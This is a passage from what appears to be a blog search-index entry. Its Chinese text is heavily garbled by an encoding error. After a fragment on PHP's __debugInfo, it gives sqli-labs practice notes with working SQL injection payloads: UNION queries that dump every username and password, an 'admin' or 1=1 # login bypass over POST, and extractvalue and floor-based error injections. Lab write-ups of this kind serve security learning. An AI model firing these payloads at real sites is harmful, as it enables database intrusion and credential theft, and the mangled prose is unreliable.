çš„å®ç°äº†ï¼Œä½†æ˜¯è¿™ä¸ªä¸åœ¨å•Šæœ¬æ–‡è®²è§£ä¹‹å†…ï¼Œæœ‰å…´è¶£å¯ä»¥è‡ªè¡Œçœ‹æ‰‹å†Œã€‚ åå…­ã€__debugInfo()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯æ³¨æ„ï¼š 1è¯¥æ–¹æ³•åœ¨PHP 5.6.0åŠå…¶ä»¥ä¸Šç‰ˆæœ¬æ‰å¯ä»¥ç”¨ï¼Œå¦‚æœä½ å‘ç°ä½¿ç”¨æ— æ•ˆæˆ–è€…æŠ¥é”™ï¼Œè¯·æŸ¥çœ‹å•Šä½ çš„ç‰ˆæœ¬ã€‚ çœ‹ä»£ç ï¼š 12345678910111213141516171819&lt;?phpclass C { private $prop; public function __construct($val) { $this-&gt;prop = $val; } /** * @return array */ public function __debugInfo() { return [ 'propSquared' =&gt; $this-&gt;prop ** 2, ]; }}var_dump(new C(42)); ç»“æœï¼š 1object(C)#1 (1) { [&quot;propSquared&quot;]=&gt; int(1764) } å†æ¬¡æ³¨æ„ï¼š 1è¿™é‡Œçš„ `**` æ˜¯ä¹˜æ–¹çš„æ„æ€ï¼Œä¹Ÿæ˜¯åœ¨PHP5.6.0åŠå…¶ä»¥ä¸Šæ‰å¯ä»¥ä½¿ç”¨ï¼Œè¯¦æƒ…è¯·æŸ¥çœ‹PHPæ‰‹å†Œ","link":"/2025/12/11/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"},{"title":"","text":"sqllibasæ‰“é¶è®°å½• 1.ä»€ä¹ˆæ˜¯æ³¨å…¥ï¼Ÿæ³¨å…¥å°±æ˜¯é€šè¿‡SQLå‘½ä»¤æ’å…¥åˆ°webè¡¨å•æäº¤æˆ–è¾“å…¥åŸŸåæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆåˆ°è¾¾æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„SQLä»£ç ï¼Œä»è€Œè¿›ä¸€æ­¥å¾—åˆ°ç›¸åº”çš„æ•°æ®ä¿¡æ¯ æ„é€ ä¸€æ¡ç²¾å·§çš„è¯­å¥ï¼Œæ¥æŸ¥è¯¢åˆ°æƒ³è¦å¾—åˆ°çš„ä¿¡æ¯ã€‚ 2.æ³¨å…¥æœ‰å“ªå‡ ç§åˆ†ç±»æŒ‰ç…§æŸ¥è¯¢å­—æ®µ æŒ‰ç…§æ³¨å…¥çš„æ–¹å¼ï¼šunionæ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œå¸ƒå°”æ³¨å…¥ï¼Œæ—¶é—´æ³¨å…¥ 3.ä»€ä¹ˆæ˜¯æ³¨å…¥ç‚¹æ³¨å…¥ç‚¹å°±æ˜¯å¯ä»¥å®è¡Œæ³¨å…¥çš„åœ°æ–¹ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªè®¿é—®æ•°æ®åº“çš„è¿æ¥ã€‚å¦‚æœ¬é¡µé¢æ³¨å…¥ç‚¹input the ID 4.å¦‚ä½•åˆ¤æ–­æ˜¯ä»¥ä»€ä¹ˆç±»å‹æ³¨å…¥å¦‚ä½•åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹æ–¹æ³•ä¸€ï¼šand 1=1å’Œand 1=2æ¥åˆ¤æ–­ å­—ç¬¦å‹æ•°å­—å‹and 1=1å’Œand 1=2éƒ½å‡ºç°æ­£å¸¸æç¤ºé¡µé¢ï¼Œåˆ™ä¸å¯èƒ½æ˜¯æ•°å­—å‹æ³¨å…¥å½“ä½ æ˜¯æ•°å­—å‹çš„æ—¶å€™è¿™ä¸ªid 1=2æ˜¯ä¸èƒ½æ­£å¸¸æ‰§è¡Œçš„ æ–¹æ³•äºŒï¼š 1?id=2-1 å­—ç¬¦å‹æ˜¯ä¸åšè¿ç®—çš„ï¼ŒæŸ¥å‡ºæ¥ä»»ç„¶æ˜¯2æ•°å­—å‹æ˜¯ä¼šåšè¿ç®—çš„ è¿™é‡Œä¸€èˆ¬ä¸ç”¨+å·ï¼Œ+å·æœ‰æ—¶å€™ä¼šè¢«ç†è§£æˆç©ºæ ¼ 5.é—­åˆæ–¹å¼æ˜¯ä»€ä¹ˆå­—ç¬¦å‹éœ€è¦é—­åˆç¬¦ï¼Œå¦‚ä¸‹æ‰€ç¤º 1$scl=&quot;select * from users where id='$id' limit 0,1&quot;; æäº¤ 1=and 1=1 1$scl=&quot;select * from users where id='1 and 1=1' limit 0,1&quot;; é‡Œé¢çš„å‘½ä»¤ä¸ä¼šå½“æˆå‘½ä»¤æ¥æ‰§è¡Œ æ•°å­—å‹åˆ™ä¸éœ€è¦é—­åˆç¬¦æ¥é—­åˆ 1$scl=&quot;select * from users where id=$id limit 0,1&quot;; æäº¤ and 1=2 1$scl=&quot;select * from users where id=$id and 1=2 limit 0,1&quot;; 6.å¦‚ä½•åˆ¤æ–­é—­åˆæ–¹å¼åˆ†ææŠ¥é”™è¿™é‡Œè¾“å…¥2â€™å‘ç°å¤šäº†ä¸€ä¸ªå•å¼•å·æŠ¥é”™äº† 7.é—­åˆçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿæ‰‹å·¥æäº¤é—­åˆç¬¦å·ï¼Œç»“æŸå‰ä¸€æ®µæŸ¥è¯¢è¯­å¥ï¼Œåé¢å³å¯åŠ å…¥å…¶ä»–è¯­å¥ï¼ŒæŸ¥è¯¢éœ€è¦çš„å‚æ•°ä¸éœ€è¦çš„è¯­å¥å¯ä»¥ç”¨æ³¨é‡Šç¬¦å·â€˜-+â€™æˆ–â€˜#æˆ–%23æ³¨é‡Šæ‰æ³¨é‡Šæ‰ï¼šåˆ©ç”¨æ³¨é‡Šç¬¦å·æš‚æ—¶å°†ç¨‹åºæ®µè„±ç¦»è¿è¡Œã€‚æŠŠæŸæ®µç¨‹åºâ€œæ³¨é‡Šæ‰â€ï¼Œå°±æ˜¯è®©å®ƒæš‚æ—¶ä¸è¿è¡Œï¼ˆè€Œéåˆ é™¤æ‰ï¼‰ 8.ä»€ä¹ˆæ˜¯unionè”åˆæ³¨å…¥è”åˆæŸ¥è¯¢æ³¨å…¥ 1?id=1' union select database ()--+ ä¸Šé¢ä¼šæŠ¥é”™å…ˆåˆ¤æ–­å‰é¢çš„åˆ—æ•°,å¦‚ä¸‹è¯­å¥åˆ¤æ–­ 1234?id=1' group by 3 --+æˆ–è€…?id=1' order by 3 --+?id=1' union select 1,2,3 --+ UNION è¦æ±‚å‰åä¸¤ä¸ªæŸ¥è¯¢çš„å­—æ®µæ•°é‡å¿…é¡»ä¸€è‡´æŸ¥è¯¢ä¸‰ä¸ªå¸¸é‡å€¼ 1,2,3åªä¼šè¯»å–ç¬¬ä¸€è¡ŒæŠŠå®ƒè¯»å–å‡ºæ¥ï¼Œç„¶åæŠŠé‚£ä¸ª1ä¿®æ”¹æˆ-1å³å¯ 1?id=-1' union select 1,2,3 --+ 1?id=-1' union select 1,version(),database() --+ 1.å…ˆæŸ¥æ‰¾æ³¨å…¥ç‚¹2.åˆ¤æ–­æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹ and 1=1 1=2/ 3-13.å¦‚æœæ˜¯å­—ç¬¦å‹ï¼Œåˆ¤æ–­é—­åˆæ–¹å¼ ' &quot; ') &quot;)4.åˆ¤æ–­æŸ¥è¯¢åˆ—æ•°ï¼Œgroup by order by5.æŸ¥è¯¢å›æ˜¾ä½ ?id=-1 'union select 1,2,3--+ sqlå‰ç½®1234cd D:\\Soft\\Penetration\\TrafficTools\\phpStudy\\Extensions\\MySQL5.7.26\\binmysql -u root -p -P 8848//rootæ˜¯æ•°æ®åº“åå­— å¦‚æœä¿®æ”¹äº†phpstudyé‡Œçš„sqlç«¯å£è¦åœ¨phpadminå¦‚ä¸‹è·¯å¾„ä¸‹çš„ 12D:\\Soft\\Penetration\\TrafficTools\\phpStudy\\WWW\\phpadmin\\phpMyAdmin4.8.5\\librariesconfig.default.php ç„¶åä¿®æ”¹æˆsqlçš„ç«¯å£ mysqlå¢åˆ æ”¹12345678910111213# ç™»å½• MySQLï¼ˆroot ç”¨æˆ·ï¼Œ-p åä¸ç›´æ¥å†™å¯†ç æ›´å®‰å…¨ï¼‰mysql -u root -p# æç¤ºè¾“å…¥å¯†ç æ—¶ï¼Œè¾“å…¥æ­£ç¡®å¯†ç åå›è½¦# æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“ï¼ˆSQL å‘½ä»¤éœ€ä»¥åˆ†å·ç»“å°¾ï¼‰show databases;# åˆ›å»ºæ•°æ®åº“ employeesï¼ŒæŒ‡å®šå­—ç¬¦é›†ä¸º utf8ï¼ˆæ³¨æ„ï¼šutf8mb4 æ›´æ¨èï¼Œæ”¯æŒå®Œæ•´ Unicodeï¼‰create database employees charset utf8;# æˆ–æ›´æ¨èï¼šcreate database employees charset utf8mb4;# åˆ é™¤æ•°æ®åº“ employeesï¼ˆå±é™©æ“ä½œï¼Œä¼šç›´æ¥åˆ é™¤æ‰€æœ‰æ•°æ®ï¼‰drop database employees; 12use employees;#ä½¿ç”¨æ•°æ®åº“ 1234567891011121314151617181920212223242526CREATE TABLE è¡¨å ( å­—æ®µ1 æ•°æ®ç±»å‹ [çº¦æŸæ¡ä»¶], å­—æ®µ2 æ•°æ®ç±»å‹ [çº¦æŸæ¡ä»¶], ...);CREATE TABLE employee ( id int, name varchar(40), sex char(4), birthday date, job varchar(100));#æŸ¥çœ‹æ•°æ®åº“ä¿¡æ¯show full columns from employee;#æŸ¥çœ‹æ•°æ®è¡¨åˆ—è¡¨select from employee;#åˆ é™¤æ•°æ®è¡¨drop table employee;#ä¿®æ”¹æ•°æ®è¡¨åç§°ä¸ºuserrename table employee to user;#ä¿®æ”¹å­—ç¬¦çº§alter table user character set utf8; 12345678910111213insert into user(id, name, sex, birthday, job)values(1, 'ctfstu', 'male', '1999-05-06', 'it');#å†™å…¥å†…å®¹INSERT INTO users (id, name, sex, birthday, job)VALUES (1, 'ctfstu', 'male', '1999-05-06', 'it'); 1select * from user; æŸ¥çœ‹è¡¨ 123alter table user add salary decimal(8,2);#å¢åŠ ä¸€åˆ— ç¬¬ä¸€ä¸ªæ•°å­— 8 è¡¨ç¤º æ€»ä½æ•°ï¼ˆæ•´æ•°éƒ¨åˆ† + å°æ•°éƒ¨åˆ†çš„æ€»é•¿åº¦ä¸èƒ½è¶…è¿‡ 8 ä½ï¼‰ã€‚ ç¬¬äºŒä¸ªæ•°å­— 2 è¡¨ç¤º å°æ•°éƒ¨åˆ†çš„ä½æ•°ï¼ˆå›ºå®šä¿ç•™ 2 ä½å°æ•°ï¼Œä¾‹å¦‚ 12345.67 æ˜¯åˆæ³•çš„ï¼Œ123456.78 åˆ™è¶…è¿‡æ€»ä½æ•°é™åˆ¶ï¼‰ã€‚ 12345å¢åŠ ä¸€è¡ŒINSERT INTO user (id, name, sex, birthday, job)VALUES (10, 'xiaohong', 'female', '2006-03-15', 'designer');update user set salary=5000;#å°†æ‰€æœ‰salaryå€¼è®¾ç½®ä¸º5000 123update user set name='benben' where id=1;#å°†id=1çš„è¡Œnameä¿®æ”¹ä¸ºbenben 123update user set name='benben2',salary=6000 where id=1;#ä¿®æ”¹id=1çš„è¡Œnameä¸ºbenben2,å·¥èµ„ä¸º6000 123456789alter table user drop salary;#åˆ é™¤salaryåˆ—delete from user where job='it';#åˆ é™¤æŸä¸€è¡Œdelete from user;#åˆ é™¤userè¡¨ æ•°æ®åº“æŸ¥è¯¢1234567891011121314INSERT INTO user ( id, name, sex, birthday, job) VALUES (2, 'dazhuang', 'male', '2005-12-24', 'it'), (3, 'shapingba', 'male', '2005-12-24', 'it'), (4, 'ciqikou', 'male', '2005-12-24', 'it'), (5, 'hongyadong', 'male', '2005-12-24', 'it'), (6, 'yikeshu', 'male', '2005-12-24', 'it'), (7, 'jiangbeizui', 'male', '2005-12-24', 'it'), (8, 'admin', 'male', '2005-12-24', 'it'), (9, 'admin1', 'male', '2005-12-24', 'it');#å†åŠ å¤šè¡Œ 123select * from user where id=1;#select+åˆ—å(*ä»£è¡¨æ‰€æœ‰)from+è¡¨å where+æ¡ä»¶è¯­å¥ 1234567select * from user where id in ('3');#ä»userè¡¨æŸ¥è¯¢æ‰€æœ‰idä¸º3,å’Œä¸Šé¢ä¸€æ ·çš„æ•ˆæœselect * from user where id=(select id from user where name=('admin'));#å­æŸ¥è¯¢ï¼Œä¼˜å…ˆæŸ¥è¯¢æ‹¬å·é‡Œé¢çš„#ä¸€èˆ¬ç”¨åœ¨ä¸çŸ¥é“idåªçŸ¥é“nameä¸ºadminçš„æŸ¥è¯¢ 1234567select id from user union select email_id from emailsselect from user where id=6 union select from emails where id=6;#ERROR:have a different number of columnsè”åˆæ³¨å…¥å‰åè¡¨æ ¼åˆ—æ•°å¿…é¡»ç›¸ç­‰select * from users where id=6 union select *,3 from emails where id=6;#3ä¸ºå¡«å……åˆ— emails è¡¨æœ¬èº«åªæœ‰ 2 ä¸ªå­—æ®µï¼ŒSELECT * FROM emails... ä¼šè¿”å› 2 ä¸ªå­—æ®µã€‚ä½†è¯­å¥ä¸­ç”¨ SELECT *, 3 ... é¢å¤–æ·»åŠ äº†ä¸€ä¸ªå›ºå®šå€¼ 3ï¼ˆä½œä¸ºç¬¬ 3 ä¸ª â€œè™šæ‹Ÿå­—æ®µâ€ï¼‰ï¼Œä½¿å¾—ç¬¬äºŒä¸ªæŸ¥è¯¢çš„ç»“æœå˜æˆäº† 3 ä¸ªå­—æ®µï¼ˆ2 ä¸ªæ¥è‡ª emails è¡¨ï¼Œ1 ä¸ªå›ºå®šå€¼ï¼‰ã€‚å­—æ®µå¿…é¡»ç›¸åŒ åˆ›å»ºemailsæ•°æ®è¡¨ 1234CREATE TABLE emails( id int, email_id varchar(40)); æ’å…¥æ•°æ® 1234567891011INSERT INTO emails ( id, email_id) VALUES (1,'Dumb@dhakkan.com'), (2,'Angel@iloveu.com'), (3,'Dummy@dhakkan.Jocal'), (4,'secure@dhakkan.local'), (5,'stupid@dhakkan.local'), (6,'superman@dhakkan.local'), (7,'batman@dhakkan.local'), (8,'admin@dhakkan.com'); 1234567891011INSERT INTO user ( id, name, sex, birthday, job) VALUES (2, 'dazhuang', 'male', '2005-12-24', 'it'), (3, 'shapingba', 'male', '2005-12-24', 'it'), (4, 'ciqikou', 'male', '2005-12-24', 'it'), (5, 'hongyadong', 'male', '2005-12-24', 'it'), (6, 'yikeshu', 'male', '2005-12-24', 'it'), (7, 'jiangbeizui', 'male', '2005-12-24', 'it'), (8, 'admin', 'male', '2005-12-24', 'it'), (9, 'admin1', 'male', '2005-12-24', 'it'); group byå¯¹æ‰€æœ‰è¿›è¡Œåˆ†ç»„usersè¡¨å¦‚æœä¸¤ä¸ªäººåå­—ç›¸åŒï¼Œidä¸ä¸€æ ·æ²¡é—®é¢˜ï¼Œä½†æ˜¯è¦æ˜¯å¯¹å¤§é‡åˆ†ç»„å°±ä¼šå®¹æ˜“æŠ¥é”™ 12345678select department,count(id) from student group by department;#æŸ¥è¯¢departmenté™¢ç³»äººæ•° count(id)å¯¹IDè¿›è¡Œè®¡æ•°#ä¸€èˆ¬ç”¨äºäºŒåˆ†æ³•åˆ¤æ–­æ•°æ®è¡¨åˆ—æ•°select * from users where id=9 group by 2;#by2,4,8~~~ä¾æ¬¡æ’æŸ¥åˆ°æŠ¥é”™ä¸ºæ­¢ï¼Œä»è€Œç¡®å®šåˆ—æ•°ï¼›group byæ˜¯æŒ‰å¤šå°‘åˆ—æ’åºselect * from users where id=9 group by 4;select * from users order by 1; æŒ‰å‡åºæ’åºï¼Œç¬¬ä¸€åˆ— 12345select stu_id from score where c_name='è®¡ç®—æœº' order by grade desc;#gradeå‚æ•°descä½¿æ’åˆ—é¡ºåºå˜ä¸ºé™åº#æŸ¥è¯¢ â€œè®¡ç®—æœºâ€ è¿™é—¨è¯¾ç¨‹çš„æ‰€æœ‰å­¦ç”Ÿçš„å­¦å·ï¼Œå¹¶æŒ‰æˆç»©ä»é«˜åˆ°ä½æ’åºselect * from users limit 1,2; ä¸Šé¢åº”è¯¥æ˜¯ 1select * from users limit 0,2; ä¸å’Œæˆ– 1234#ä¸¤ä¸ªæ¡ä»¶éœ€è¦åŒæ—¶æ»¡è¶³select * from users where id=1 and username='benben';#ä¸¤ä¸ªæ¡ä»¶æœ‰ä¸€ä¸ªæ»¡è¶³select * from users where id=1 or username='benben'; oråœ¨postæäº¤é‡Œé¢åšä¸‡èƒ½å¯†ç åˆ¤æ–­å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹ group_concat å¤šè¡Œåˆå¹¶å˜ä¸€è¡Œ 1select group_concat(id,username,password)from users; æŠŠæ‰€æœ‰å†™åˆ°çš„ç±»å…¨åˆå¹¶ 1select database() æŸ¥çœ‹å½“å‰æ•°æ®åº“åç§° 1select version() æŸ¥çœ‹å½“å‰æ•°æ®åº“çš„ç‰ˆæœ¬ï¼Œé˜²ç«å¢™ç»•è¿‡å¯ä»¥ç”¨åˆ°ï¼Œä¾‹å¦‚ä»€ä¹ˆæ³¨é‡Šç¬¦ç»•è¿‡ æŸ¥çœ‹å½“å‰æƒé™ 1show grants; unionæ³¨å…¥1.äº†è§£unionæ³¨å…¥è¿‡ç¨‹ä¸­ç”¨åˆ°çš„å…³é”®æ•°æ®åº“ã€æ•°æ®è¡¨ã€æ•°æ®åˆ—2.sqlæŸ¥è¯¢ä¸­group_concatçš„ä½œç”¨ æœ€ç»ˆç›®æ ‡ä½¿ç”¨unionæ³¨å…¥æ‹¿åˆ°é¶æœºä¸­æ•°æ®åº“é‡Œçš„æ‰€æœ‰ç”¨æˆ·åå’Œå¯†ç ã€‚ æ‹¿åˆ°è¡¨åï¼Œåˆ—å 1.æå‰äº†è§£ 1?id=1' union select 1,2,3--+ å›æ˜¾ä½æ˜¯2ï¼Œ3æŸ¥æ•°æ®åº“æ˜¯security 1?id=1' union select 1,2,database()--+ ç„¶åæŸ¥æ•°æ®è¡¨ 1?id=-1' union select 1,2,table_name from information_schema.tables --+ ä»…å±äºå½“å‰æ•°æ®åº“çš„è¡¨ 1?id=-1' union select 1,2,table_name from information_schema.tables where table_schema=database() --+ è¿™é‡Œåªèƒ½æ˜¾ç¤ºä¸€ä¸ªè¡¨åï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ªgroup_concat 1?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ è¿™é‡ŒæŸ¥åˆ°äº†æ‰€æœ‰æ•°æ®è¡¨ ç´§æ¥ç€å°±æ˜¯åˆ—å 1?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns --+ é‡Œé¢å¾ˆå¤šæ²¡å•¥ç”¨çš„ï¼Œæˆ‘ä»¬å°±çœ‹ä¸€ä¸ªæ•°æ®è¡¨çš„åˆ—å 1?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+ æŸ¥å½“å‰æ•°æ®åº“ä¸­ users è¡¨çš„æ‰€æœ‰å­—æ®µåï¼ˆåˆ—åï¼‰ ç„¶åæŸ¥æœ€ç»ˆç›®æ ‡ 12345?id=-1' union select 1,2,group_concat(username,password) from users --+æˆ–è€…?id=-1' union select 1,group_concat(username,password),3 from users --+ å°æŠ€å·§ï¼Œçœ‹èµ·æ¥ä¸æ–¹ä¾¿ç§‘å¦‚ä¸‹æ“ä½œ 1?id=-1' union select 1,2,group_concat(username,&quot;~&quot;,password) from users --+ æ•°å­—å‹unionæ³¨å…¥æ•°å­—å‹ä¸éœ€è¦åˆ¤æ–­é—­åˆæ–¹å¼ 1.ç¡®å®šæ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹2.ä½¿ç”¨group byçš„äºŒåˆ†æ³•åˆ¤æ–­unionè¯­å¥ä¸­å‰ä¸€ä¸ªæŸ¥è¯¢çš„åˆ—æ•°3.ä¼˜åŒ–è¯­å¥ï¼Œå°†dæ”¹ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„æ•°å­—4.ä½¿ç”¨selectè¯­å¥ï¼ŒæŸ¥è¯¢é¶æœºæ•°æ®åº“åº“å5.ä½¿ç”¨selectè¯­å¥ï¼ŒæŸ¥è¯¢é¶æœºæ‰€æœ‰è¡¨å6.ä½¿ç”¨selectè¯­å¥ï¼ŒæŸ¥è¯¢é¶æœºæ‰€æœ‰åˆ—å7.æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·åå¯†ç  less-2åˆ¤æ–­æ˜¯æ•°å­—å‹æ³¨å…¥ç”¨2-1 å’Œ1å»æ¯”è¾ƒï¼Œç›¸åŒå°±æ˜¯æ•°å­—å‹ è¿™é‡Œå°±ä¸ç”¨å»é—­åˆäº†æˆ‘ä»¬æ¥ç€å»åˆ¤æ–­åˆ—æ•°ï¼Œè¿™é‡Œç”¨order byåˆ¤æ–­æ˜¯3åˆ—æ¥ç€è”åˆæ³¨å…¥ï¼Œè®°å¾—è¦æ”¹æˆ-1ä¸ç„¶åªä¼šå›æ˜¾ç¬¬ä¸€è¡Œ `` Post unionPOSTæäº¤å’ŒGETæäº¤POSTæäº¤çš„ä½¿ç”¨HackBarPOSTæäº¤æ³¨å…¥POSTæäº¤æŠ¥é”™æ³¨å…¥ POSTæäº¤å’ŒGETæäº¤1.getæäº¤å¯ä»¥è¢«ç¼“å­˜ï¼Œpostæäº¤ä¸ä¼š2.getæäº¤å‚æ•°ä¼šä¿ç•™åœ¨æµè§ˆå™¨çš„å†å²è®°å½•é‡Œï¼Œpostæäº¤ä¸ä¼š3.getæäº¤å¯ä»¥è¢«æ”¶è—ä¸ºä¹¦ç­¾ï¼Œpostæäº¤ä¸ä¼š4.getæäº¤æœ‰é•¿åº¦é™åˆ¶ï¼Œæœ€é•¿2048ä¸ªå­—ç¬¦ï¼›postæäº¤æ²¡æœ‰é•¿åº¦è¦æ±‚ï¼Œä¸æ˜¯åªå…è®¸ä½¿ç”¨ASCIIå­—ç¬¦ï¼Œè¿˜å¯ä»¥ä½¿ç”¨äºŒè¿›åˆ¶æ•°æ®æœ‰å¯èƒ½æº¢å‡ºç»•è¿‡ï¼Œwafé˜²ç«å¢™åªæ£€æŸ¥å‰é¢å¤šå°‘ä¸ªæ•°æ®ï¼Œ9000å¤šä¸ª postæäº¤æ¯”getæäº¤æ›´å®‰å…¨ ä¸‹é¢è¿™ä¸ªurlåœ¨æµè§ˆå™¨é‡Œé¢å°±æ˜¯getæäº¤è¢«ç¼“å­˜ less-11æºä»£ç  1@$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;; ä¸‹é¢è¿™æ˜¯usernameä¸‡èƒ½å¯†é’¥ 1admin' or 1=1 # ä»£åˆ°ä¸Šé¢çš„è¯­å¥ä¸­å°±æ˜¯ 1@$sql=&quot;SELECT username, password FROM users WHERE username='admin' or 1=1 #' and password='$passwd' LIMIT 0,1&quot;; #æŠŠåé¢å…¨æ³¨é‡Šæ‰äº†ï¼Œ åˆ©ç”¨å‚æ•°åŒ–æŸ¥è¯¢é¿å…SQLæ³¨å…¥æ¼æ´ postæŸ¥æ•°æ®åº“ 1uname='union select 1,(select database()) #&amp;passwd=123&amp;Submit=Submit åˆ¤æ–­åˆ—æ•° 1uname=admin'group by 2#&amp;passwd=123&amp;submit=Submit postæäº¤æŸ¥å­—æ®µ 1uname='union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users')#&amp;passwd=123&amp;Submit=Submit æŸ¥æ•°æ® 1uname='union select 1,(select group_concat(username,&quot;:&quot;,password) from users)#&amp;passwd=123&amp;Submit=Submit æŠ¥é”™æ³¨å…¥extractvalueä»€ä¹ˆæ˜¯æŠ¥é”™æ³¨å…¥ æ„é€ è¯­å¥ï¼Œè®©é”™è¯¯ä¿¡æ¯ä¸­å¤¹æ‚å¯ä»¥æ˜¾ç¤ºæ•°æ®åº“å†…å®¹çš„æŸ¥è¯¢è¯­å¥è¿”å›æŠ¥é”™æç¤ºä¸­åŒ…å«æ•°æ®åº“ä¸­çš„å†…å®¹ ===1.é€šè¿‡floor()æŠ¥é”™æ³¨å…¥===*2.é€šè¿‡extractValue()æŠ¥é”™æ³¨å…¥**3.é€šè¿‡updateXml()æŠ¥é”™æ³¨å…¥*4.é€šè¿‡NAME_CONST()æŠ¥é”™æ³¨å…¥5.é€šè¿‡jion()æŠ¥é”™æ³¨å…¥6.é€šè¿‡exp()æŠ¥é”™æ³¨å…¥7.é€šè¿‡geometryCollection()æŠ¥é”™æ³¨å…¥8.é€šè¿‡polygon()æŠ¥é”™æ³¨å…¥9.é€šè¿‡multipoint()æŠ¥é”™æ³¨å…¥10.é€šè¿‡multlinestring()æŠ¥é”™æ³¨å…¥11.é€šè¿‡multpolygon()æŠ¥é”™æ³¨å…¥12.é€šè¿‡linestring()æŠ¥é”™æ³¨å…¥ å…ˆåˆ›å»ºä¸¤ä¸ªæ•°æ®åº“ 1234567891011121314151617181920212223242526272829303132create database ctfstu charset utf8;create table xml(doc varchar(150));insert into xml values('&lt;book&gt;&lt;title&gt;how to become a bad boy&lt;/title&gt;&lt;author&gt;&lt;initial&gt;hualong&lt;/initial&gt;&lt;surname&gt;Melton&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;');insert into xml values('&lt;book&gt;&lt;title&gt;A bad boy how to get agirlfriend&lt;/title&gt;&lt;author&gt;&lt;initial&gt;Love&lt;/initial&gt;&lt;surname&gt;benben&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;');select extractvalue(doc,'/book/author/surname')from xml; docæ˜¯åˆ—åï¼Œç¬¬äºŒä¸ªæ˜¯æŸ¥è¯¢è·¯å¾„,æŸ¥åˆ°çš„æ˜¯benben 12345678&lt;book&gt; &lt;title&gt;A bad boy how to get a girlfriend&lt;/title&gt; &lt;author&gt; &lt;initial&gt;Love&lt;/initial&gt; &lt;surname&gt;benben&lt;/surname&gt; &lt;/author&gt; &lt;/book&gt;select extractvalue(doc,'~book/author/surname')from xml; ä¸Šé¢è¿™ä¸ªæŠ¥é”™æ˜¯æœ‰å›æ˜¾è¯­å¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æŠ¥é”™å‰æ„é€ ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ 1select extractvalue(doc,concat(0x7e,(select database()))) from xml; ä¸Šè¿°æ˜¯æ˜¾ç¤ºå½“å‰åº“å less-5å°è¯•æ„é€ ä»¥ä¸‹è¯­å¥ 1?id=-1' union select 1,2,database() --+ å°è¯•æ•…æ„å†™é”™database 1?id=-1' union select 1,2,datdbase() --+ å‡ºç°å¦‚ä¸‹æŠ¥é”™å¯ä»¥çŸ¥é“å½“å‰æ•°æ®åº“çš„åº“åæ˜¯security 1234?id=100' union select 1,extractvalue(1,concat(0x7e,(select database()))),3--+#0x7eå°±æ˜¯~å·extractvalueè¿™é‡Œåˆ—å¯ä»¥éšä¾¿å†™ï¼Œä¸ºçš„å°±æ˜¯æŠ¥é”™ ä¸Šè¿°è¯­å¥ä¹Ÿå¯ä»¥æŸ¥åˆ°åº“åæ˜¯security 1?id=100' and 1=extractvalue(1,concat(0x7e,(select database()))) --+ ç„¶åæŸ¥è¡¨å 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),3--+ æŸ¥åˆ°å½“å‰æ•°æ®åº“è¡¨åç»§ç»­æŸ¥åˆ—å 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) ,3--+ æœ€åæŸ¥æ•°æ® 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users))) ,3--+ æŠ¥é”™æ³¨å…¥ä¸€æ¬¡åªèƒ½è¿”å›32ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æ­¤æ—¶è¦ç”¨substringsubstring(â€œç¬¬ä¸€â€,â€ç¬¬äºŒÂ·â€,â€ç¬¬ä¸‰â€) ç¬¬ä¸€ï¼šå°±æ˜¯å­—ç¬¦ç¬¬äºŒï¼šä»å“ªä¸€ä½å¼€å§‹æ˜¾ç¤ºç¬¬ä¸‰ï¼šæ˜¾ç¤ºæ€»å…±å¤šå°‘ä½å­—ç¬¦å¦‚ä¸‹æ‰€ç¤º 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select substring(group_concat(id,username,password),1,3) from users))) ,3--+ flooræŠ¥é”™æ³¨å…¥æ¶‰åŠåˆ°å‡½æ•°è¾ƒå¤š rand()å‡½æ•°ï¼šéšæœºè¿”å›0-1ä¹‹é—´çš„å°æ•°floor()å‡½æ•°ï¼šå°æ•°å‘ä¸‹å–æ•´ï¼Œå‘ä¸Šå–æ•´æ•°ceiling()concat_ws()å‡½æ•°ï¼šå°†æ‹¬å·å†…æ•°æ®ç”¨ç¬¬ä¸€ä¸ªå­—æ®µè¿æ¥èµ·æ¥group by:åˆ†ç»„as:åˆ«åcount()å‡½æ•°:æ±‡æ€»ç»Ÿè®¡æ•°é‡limit:è¿™é‡Œç”¨äºæ˜¾ç¤ºæŒ‡å®šè¡Œæ•° 1234567891011121314151617181920212223?id=0' union select 1,count(*),concat_ws('-',(select concat('~',id,username,':',password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+select rand() #éšæœºç”Ÿæˆ0-1select rand() #éšæœºç”Ÿæˆ0-2select rand() from users 